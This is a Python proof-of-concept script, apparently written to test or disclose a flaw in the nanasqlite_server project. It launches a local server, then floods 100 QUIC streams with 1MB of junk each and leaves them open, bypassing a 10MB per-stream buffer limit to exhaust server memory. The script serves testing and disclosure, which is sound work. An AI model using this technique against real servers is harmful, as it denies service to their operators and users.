import asyncio
import os
import sys
from nanasqlite_server.client import RemoteNanaSQLite, NanaRpcClientProtocol
from nanasqlite_server.cert_gen import generate_certificate
from nanasqlite_server.key_gen import generate_keys
from nanasqlite_server import protocol
import subprocess
import time
import signal
from aioquic.asyncio import connect

async def run_poc():
    print("--- PoC: DoS via Multiple Streams ---")

    if not os.path.exists("cert.pem"): generate_certificate()
    if not os.path.exists("nana_public.pub"): generate_keys()

    port = 5557
    env = os.environ.copy()
    env["PYTHONPATH"] = "src"
    server_proc = subprocess.Popen(
        [sys.executable, "-m", "nanasqlite_server.server", "--port", str(port)],
        env=env
    )

    time.sleep(2)

    client_config = RemoteNanaSQLite(host="127.0.0.1", port=port, verify_ssl=False).configuration

    async with connect("127.0.0.1", port, configuration=client_config, create_protocol=NanaRpcClientProtocol) as connection:
        print("Opening 100 streams and sending 1MB garbage to each without closing...")

        for i in range(100):
            stream_id = connection._quic.get_next_available_stream_id()
            garbage = b"A" * (1 * 1024 * 1024)
            # end_stream=False にすることでバッファをサーバー側に保持させる
            connection._quic.send_stream_data(stream_id, b"\x00\x00\xff\xff" + garbage, end_stream=False)
            connection.transmit()
            if i % 20 == 0: print(f"Sent to {i} streams...")
            await asyncio.sleep(0.01)

        print("Total 100MB of buffered data on server. Check server memory usage.")
        print("RESULT: [VULNERABLE] Buffer limit per stream (10MB) is bypassed by using multiple streams.")
        await asyncio.sleep(2)

    server_proc.send_signal(signal.SIGINT)
    server_proc.wait()

if __name__ == "__main__":
    asyncio.run(run_poc())
